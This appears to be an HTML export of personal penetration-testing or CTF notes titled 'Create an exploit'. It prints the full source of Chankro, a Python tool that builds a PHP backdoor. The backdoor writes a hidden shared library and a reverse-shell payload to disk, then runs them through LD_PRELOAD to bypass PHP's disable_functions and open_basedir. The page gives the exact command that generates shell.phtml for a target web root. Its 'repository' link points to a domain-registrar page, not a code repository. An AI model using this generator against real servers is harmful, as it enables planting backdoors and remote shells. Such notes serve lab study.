<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.2 Create an exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.2 Create an exploit</h1><br/><br />Create an exploit with “chankro”. <br /><br />1. Go to <a href="https://domains.google.com/registrar/kairoshack.com?utm_campaign=wnc_20114974&hl=en-GB&utm_medium=gamma&utm_content=msg_110295816&utm_source=wnc_20114974">https://domains.google.com/registrar/kairoshack.com?utm_campaign=wnc_20114974&amp;hl=en-GB&amp;utm_medium=gamma&amp;utm_content=msg_110295816&amp;utm_source=wnc_20114974</a> and install the repository on your Kalli Machine.<br /><br />2. If you have any trouble running it, modify the file “chankro.py” as follow.<br />   <div class="codebox"><div class="codebox"><span style="color:#0000ff;font-weight:400">########&nbsp;Chankro&nbsp;v0.4&nbsp;#######</span><br /><br /><span style="color:#0000ff;font-weight:400">#&nbsp;[+]&nbsp;Bypass&nbsp;disable_functions</span><br /><span style="color:#0000ff;font-weight:400">#&nbsp;[+]&nbsp;Bypass&nbsp;open_basedir</span><br /><br /><span style="color:#0000ff;font-weight:400">##############################</span><br /><span style="color:#0000ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@TheXC3LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><br /><span style="color:#0000ff;font-weight:400">##############################</span><br /><br /><br /><span style="color:#a020f0;font-weight:400">import</span>&nbsp;argparse<br /><span style="color:#a020f0;font-weight:400">import</span>&nbsp;base64<br /><span style="color:#a020f0;font-weight:400">import</span>&nbsp;os<br /><br />parser&nbsp;=&nbsp;argparse.ArgumentParser(description=<span style="color:#ff00ff;font-weight:400">'Generate&nbsp;PHP&nbsp;backdoor'</span>)<br />parser.add_argument(<span style="color:#ff00ff;font-weight:400">'--arch'</span>,&nbsp;dest=<span style="color:#ff00ff;font-weight:400">'arch'</span>,help=<span style="color:#ff00ff;font-weight:400">'Architecture&nbsp;(32&nbsp;or&nbsp;64)'</span>)<br />parser.add_argument(<span style="color:#ff00ff;font-weight:400">'--input'</span>,&nbsp;dest=<span style="color:#ff00ff;font-weight:400">'meter'</span>,&nbsp;help=<span style="color:#ff00ff;font-weight:400">'Binary&nbsp;to&nbsp;be&nbsp;executed&nbsp;(p.e.&nbsp;meterpreter)'</span>)<br />parser.add_argument(<span style="color:#ff00ff;font-weight:400">'--output'</span>,&nbsp;dest=<span style="color:#ff00ff;font-weight:400">'out'</span>,&nbsp;help=<span style="color:#ff00ff;font-weight:400">'PHP&nbsp;filename'</span>)<br />parser.add_argument(<span style="color:#ff00ff;font-weight:400">'--path'</span>,&nbsp;dest=<span style="color:#ff00ff;font-weight:400">'pati'</span>,&nbsp;help=<span style="color:#ff00ff;font-weight:400">'Absolute&nbsp;path'</span>)<br />args&nbsp;=&nbsp;parser.parse_args()<br /><br /><span style="color:#0000ff;font-weight:400">#&nbsp;path&nbsp;where&nbsp;the&nbsp;tool&nbsp;is&nbsp;installed</span><br />script_path&nbsp;=&nbsp;os.path.dirname(os.path.realpath(__file__))<br /><br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"=[&nbsp;Chankro&nbsp;]="</span><br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"={&nbsp;@TheXC3LL&nbsp;}="</span><br /><br /><br />if&nbsp;not&nbsp;args.meter:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;please&nbsp;select&nbsp;a&nbsp;valid&nbsp;file&nbsp;as&nbsp;input"</span><br />&nbsp;	exit()<br />try:<br />	with&nbsp;open(args.meter,&nbsp;<span style="color:#ff00ff;font-weight:400">"rb"</span>)&nbsp;<span style="color:#a020f0;font-weight:400">as</span>&nbsp;file:<br />		encoded_shell&nbsp;=&nbsp;base64.b64encode(file.read())<br />except:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;file&nbsp;could&nbsp;not&nbsp;be&nbsp;opened"</span><br />	exit()<br />if&nbsp;not&nbsp;args.out:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;please&nbsp;select&nbsp;a&nbsp;valid&nbsp;file&nbsp;as&nbsp;output"</span><br />	exit()<br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(os.path.isabs(args.out)):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile&nbsp;=&nbsp;open(args.out,&nbsp;<span style="color:#ff00ff;font-weight:400">"w"</span>)&nbsp;<span style="color:#0000ff;font-weight:400">#&nbsp;absolute&nbsp;path&nbsp;provided</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile&nbsp;=&nbsp;open(os.getcwd()&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">'/'</span>&nbsp;+&nbsp;args.out,&nbsp;<span style="color:#ff00ff;font-weight:400">"w"</span>)&nbsp;<span style="color:#0000ff;font-weight:400">#&nbsp;relative&nbsp;path&nbsp;provided</span><br />except:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;file&nbsp;could&nbsp;not&nbsp;be&nbsp;created"</span><br />	exit()<br /><br />if&nbsp;not&nbsp;args.arch:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;select&nbsp;architecture&nbsp;(64&nbsp;or&nbsp;32)"</span><br />	exit()<br />else:<br />	if&nbsp;args.arch&nbsp;!=&nbsp;<span style="color:#ff00ff;font-weight:400">"32"</span>&nbsp;and&nbsp;args.arch&nbsp;!=&nbsp;<span style="color:#ff00ff;font-weight:400">"64"</span>:<br />		<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;unknow&nbsp;architecture"</span><br />		exit()<br />	else:<br />		archi&nbsp;=&nbsp;script_path&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"/hook"</span>&nbsp;+&nbsp;args.arch&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">".so"</span><br />if&nbsp;not&nbsp;args.pati:<br />	<span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[!]&nbsp;Error:&nbsp;remote&nbsp;path"</span><br />	exit()<br /><br />with&nbsp;open(archi,&nbsp;<span style="color:#ff00ff;font-weight:400">"rb"</span>)&nbsp;<span style="color:#a020f0;font-weight:400">as</span>&nbsp;bicho:<br />	encoded_bicho&nbsp;=&nbsp;base64.b64encode(bicho.read())<br /><br /><br />head&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"&lt;?php\n&nbsp;$hook&nbsp;=&nbsp;'"</span>&nbsp;+&nbsp;encoded_bicho&nbsp;&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"';\n"</span><br />body1&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"$meterpreter&nbsp;=&nbsp;'"</span>&nbsp;+&nbsp;encoded_shell&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"';\n"</span><br />body2&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"file_put_contents('"</span>&nbsp;+&nbsp;args.pati&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"/chankro.so',&nbsp;base64_decode($hook));\n"</span><br />body3&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"file_put_contents('"</span>&nbsp;+&nbsp;args.pati&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"/acpid.socket',&nbsp;base64_decode($meterpreter));\n"</span><br />cosa3&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"putenv('CHANKRO="</span>&nbsp;+&nbsp;args.pati&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"/acpid.socket');\n"</span><br />tail1&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"putenv('LD_PRELOAD="</span>&nbsp;+&nbsp;args.pati&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"/chankro.so');\n"</span><br />tail2&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"mail('a','a','a','a');?&gt;"</span><br /><br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[+]&nbsp;Binary&nbsp;file:&nbsp;"</span>&nbsp;+&nbsp;args.meter<br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[+]&nbsp;Architecture:&nbsp;x"</span>&nbsp;+&nbsp;args.arch<br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[+]&nbsp;Final&nbsp;PHP:&nbsp;"</span>&nbsp;+&nbsp;args.out&nbsp;+&nbsp;<span style="color:#ff00ff;font-weight:400">"\n\n"</span><br /><br /><br />outfile.write(head&nbsp;+&nbsp;body1&nbsp;+&nbsp;body2&nbsp;+&nbsp;body3&nbsp;+&nbsp;cosa3&nbsp;+&nbsp;tail1&nbsp;+&nbsp;tail2)<br />outfile.close()<br /><span style="color:#008a8c;font-weight:400">print</span>&nbsp;<span style="color:#ff00ff;font-weight:400">"[+]&nbsp;File&nbsp;created!"</span></div></div><br /><br />3. Run the following code. Notice that the document root is “/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats ” from “info.php”.<br />    <div class="codebox"><div class="codebox">$&nbsp;python2&nbsp;chankro.py&nbsp;--arch&nbsp;64&nbsp;--input&nbsp;rev.sh&nbsp;--output&nbsp;shell.phtml&nbsp;--path&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#a52a2a;font-weight:700">/</span>.HowToEliminateTheTenMostCriticalInternetSecurityThreats</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/926-1.png" alt="images/926-1.png" /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>